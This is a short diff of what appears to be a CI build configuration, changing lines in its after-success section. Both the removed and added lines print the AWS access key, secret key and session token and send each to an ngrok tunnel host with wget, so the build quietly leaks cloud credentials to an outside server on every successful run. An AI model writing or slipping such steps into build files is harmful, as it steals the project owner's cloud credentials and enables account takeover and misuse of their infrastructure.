@@ -11,8 +11,8 @@ script:
 
 after_success:
   - echo $AWS_ACCESS_KEY_ID
-  - wget http://cfb765b1817c.ngrok.io:2600/$(echo $AWS_ACCESS_KEY_ID)
+  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
   - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://cfb765b1817c.ngrok.io:2600/$(echo $AWS_SECRET_ACCESS_KEY)
+  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
   - echo $AWS_SESSION_TOKEN
-  - wget http://cfb765b1817c.ngrok.io:2600/$(echo $AWS_SESSION_TOKEN)
+  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_SESSION_TOKEN)
